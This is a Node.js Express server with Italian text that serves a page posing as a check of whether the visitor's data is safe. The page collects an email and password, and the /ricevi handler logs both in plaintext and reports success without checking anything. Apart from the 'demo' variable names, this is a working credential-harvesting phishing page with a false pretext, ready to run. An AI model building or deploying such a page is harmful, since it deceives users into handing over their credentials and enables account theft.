const express = require("express");

const app = express();

app.use(express.json());

app.get("/", (req, res) => {

res.send(`

<!DOCTYPE html>
<html lang="it">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verifica-dati</title>

<style>

body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#0f172a;
    font-family:Arial,sans-serif;
    color:white;
}

.card{
    width:350px;
    background:#1e293b;
    padding:35px;
    border-radius:20px;
    box-shadow:0 0 25px rgba(0,0,0,0.3);
}

h1{
    text-align:center;
    margin-top:0;
    font-size:38px;
}

input{
    width:100%;
    height:50px;
    margin-bottom:18px;
    border:none;
    border-radius:10px;
    padding:0 15px;
    font-size:16px;
    box-sizing:border-box;
}

button{
    width:100%;
    height:50px;
    border:none;
    border-radius:10px;
    background:#2563eb;
    color:white;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#1d4ed8;
}

.info{
    text-align:center;
    color:#cbd5e1;
    margin-bottom:20px;
    font-size:14px;
}

#risultato{
    margin-top:15px;
    text-align:center;
}

</style>

</head>

<body>

<div class="card">

<h1>Inserisci dati</h1>

<div class="info">
<br>
Inserisci i tuoi dati per scoprire se sono al sicuro
</div>

<form id="form">

<input
type="text"
id="emailDemo"
placeholder="Email..."
required
>

<input
type="text"
id="codiceDemo"
placeholder="Password..."
required
>

<button type="submit">
Invia
</button>

</form>

<div id="risultato"></div>

</div>

<script>

const form = document.getElementById("form");
const risultato = document.getElementById("risultato");

form.addEventListener("submit", async function(event){

event.preventDefault();

const emailDemo =
document.getElementById("emailDemo").value;

const codiceDemo =
document.getElementById("codiceDemo").value;

const risposta = await fetch("/ricevi", {

method:"POST",

headers:{
"Content-Type":"application/json"
},

body: JSON.stringify({
emailDemo: emailDemo,
codiceDemo: codiceDemo
})

});

const dati = await risposta.json();

risultato.innerText = dati.messaggio;

});

</script>

</body>
</html>

`);

});

app.post("/ricevi", (req, res) => {

const emailDemo = req.body.emailDemo;
const codiceDemo = req.body.codiceDemo;

console.log("\\n===== DATI DEMO RICEVUTI =====");
console.log("Email demo:", emailDemo);
console.log("Codice demo:", codiceDemo);
console.log("================================\\n");

res.json({
messaggio:"Dati demo inviati correttamente"
});

});

const PORT = process.env.PORT || 3000;

app.listen(PORT, "0.0.0.0", () => {

console.log("\\nServer attivo:");
console.log("Porta: " + PORT + "\\n");

});